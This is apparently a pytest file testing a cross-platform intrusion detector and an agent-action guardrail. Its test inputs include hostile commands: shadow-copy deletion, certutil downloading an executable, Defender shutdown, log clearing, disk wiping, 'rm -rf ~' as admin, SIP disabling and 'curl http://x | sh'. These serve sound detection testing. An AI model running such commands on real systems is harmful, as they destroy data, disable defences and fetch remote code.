"""Simulate each OS by patching sys.platform and reloading the platform + detector modules."""
import importlib, sys, pytest
from sentinel.events import Event

def load(platform):
    orig = sys.platform; sys.platform = platform
    try:
        import sentinel.platform as plat, sentinel.detector as det
        importlib.reload(plat); importlib.reload(det)
        return plat, det
    finally:
        sys.platform = orig

@pytest.fixture(autouse=True)
def restore():
    yield
    import sentinel.platform as plat, sentinel.detector as det
    importlib.reload(plat); importlib.reload(det)

def proc(det, cmd, exe=""):
    return list(det.Detector().run(Event("process", "new_process", {"cmdline": cmd, "exe": exe, "name": "x"})))

def test_windows_rules():
    plat, det = load("win32")
    assert plat.OS == "windows" and plat.norm_path(r"C:\Users\Me\x.TXT") == "c:/users/me/x.txt"
    for cmd in ["powershell -nop -w hidden -enc SQBFAFgA", "vssadmin delete shadows /all /quiet",
                "certutil -urlcache -split -f http://x/a.exe", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v a /d c:\\t.exe",
                "sc stop windefend", "wevtutil cl Security", "cipher /w:C:"]:
        f = proc(det, cmd); assert f and f[0].rule == "dangerous_command", cmd
    assert proc(det, "runas /user:Administrator cmd")[0].rule == "privilege_escalation"
    assert proc(det, r"C:\Users\Me\AppData\Local\Temp\a.exe", exe=r"C:\Users\Me\AppData\Local\Temp\a.exe")[0].rule == "exec_from_temp"
    fs = list(det.Detector().run(Event("file", "file_created", {"path": r"C:\Users\Me\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.lnk"})))
    assert fs and fs[0].rule == "sensitive_file_change"
    assert plat.block_ip_cmd("1.2.3.4")[0] == "netsh"
    assert not proc(det, "notepad.exe C:\\notes.txt")

def test_macos_rules():
    plat, det = load("darwin")
    assert plat.OS == "macos"
    for cmd in ["osascript -e 'do shell script \"rm -rf ~\" with administrator privileges'",
                "csrutil disable", "xattr -d com.apple.quarantine /tmp/app", "launchctl load /tmp/evil.plist",
                "diskutil eraseDisk JHFS+ x disk0"]:
        f = proc(det, cmd); assert f and f[0].rule == "dangerous_command", cmd
    fs = list(det.Detector().run(Event("file", "file_created", {"path": "/Library/LaunchDaemons/com.evil.plist"})))
    assert fs and fs[0].rule == "sensitive_file_change"
    assert plat.block_ip_cmd("1.2.3.4")[0] == "pfctl"
    assert proc(det, "/var/folders/ab/T/x", exe="/var/folders/ab/T/x")[0].rule == "exec_from_temp"

def test_linux_rules_unchanged():
    plat, det = load("linux")
    assert proc(det, "curl http://x | sh")[0].rule == "dangerous_command"
    assert plat.block_ip_cmd("1.2.3.4")[0] in ("iptables", "nft")

def test_guardrail_windows_paths():
    from sentinel.guardrail import Guardrail
    import sentinel.guardrail as gr
    plat, _ = load("win32"); importlib.reload(gr)
    try:
        g = gr.Guardrail("policy/agent_guardrails.yaml")
        r = g.decide(Event("agent", "agent_action", {"agent_id": "coder-1", "action": "write:file",
                                                     "target": r"C:\Workspace\app.py"}))
        assert r.verdict == "deny"   # not in allow_targets (/workspace/*) — drive prefix differs, as it should
        r = g.decide(Event("agent", "agent_action", {"agent_id": "coder-1", "action": "write:file",
                                                     "target": r"\workspace\App.PY"}))
        assert r.verdict == "allow"  # backslashes + case normalised
    finally:
        importlib.reload(gr)
